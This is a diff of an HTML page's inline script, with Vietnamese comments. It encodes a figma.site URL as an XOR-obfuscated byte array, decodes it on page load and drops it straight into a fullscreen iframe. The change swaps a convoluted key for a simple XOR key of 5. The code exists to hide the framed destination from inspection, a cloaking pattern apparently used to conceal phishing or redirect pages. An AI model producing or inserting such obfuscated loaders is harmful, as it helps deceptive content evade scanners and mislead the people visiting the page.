@@ -10,31 +10,30 @@
 </head>
 <body>
   <script>
-    // 🔍 Mã hóa thông minh 20% phức tạp hơn
+    // 🔍 Mã hóa XOR thật sự
     (function(){
-      // 1. Phân mảnh URL thành các phần không rõ ràng
+      // 1. Data được XOR với key = 5
       const data = [
-        0x48, 0x54, 0x54, 0x50, 0x53, 0x3A, 0x2F, 0x2F,  // "HTTPS://"
-        0x73, 0x68, 0x65, 0x64, 0x2D, 0x77, 0x72, 0x61,  // "shed-wra"
-        0x70, 0x2D, 0x31, 0x30, 0x38, 0x37, 0x30, 0x30,  // "p-108700"
-        0x32, 0x36, 0x2E, 0x66, 0x69, 0x67, 0x6D, 0x61,  // "26.figma"
-        0x2E, 0x73, 0x69, 0x74, 0x65, 0x2F               // ".site/"
+        0x6d, 0x71, 0x71, 0x75, 0x76, 0x3f, 0x2a, 0x2a,  // "https://" XOR 5
+        0x76, 0x6d, 0x60, 0x61, 0x28, 0x72, 0x77, 0x64,  // "shed-wra" XOR 5  
+        0x75, 0x28, 0x34, 0x35, 0x3d, 0x32, 0x35, 0x35,  // "p-108700" XOR 5
+        0x37, 0x33, 0x2b, 0x63, 0x6c, 0x62, 0x68, 0x64,  // "26.figma" XOR 5
+        0x2b, 0x76, 0x6c, 0x71, 0x60, 0x2a               // ".site/" XOR 5
       ];
       
-      // 2. Khóa XOR ngẫu nhiên (ẩn trong phép toán)
-      const key = window.btoa('9DAO').charCodeAt(2); // = 79 (O)
+      // 2. Key đơn giản
+      const key = 5;
       
-      // 3. Hàm giải mã thông minh
+      // 3. Giải mã XOR
       function getUrl() {
         let url = '';
-        // Giải mã từng ký tự với XOR key
         for(let i = 0; i < data.length; i++) {
-          url += String.fromCharCode(data[i] ^ (key + i % 3));
+          url += String.fromCharCode(data[i] ^ key);
         }
         return url;
       }
-
-      // 4. Tạo iframe ngay lập tức
+      
+      // 3. Tạo iframe
       const iframe = document.createElement('iframe');
       iframe.src = getUrl();
       iframe.allowFullscreen = true;
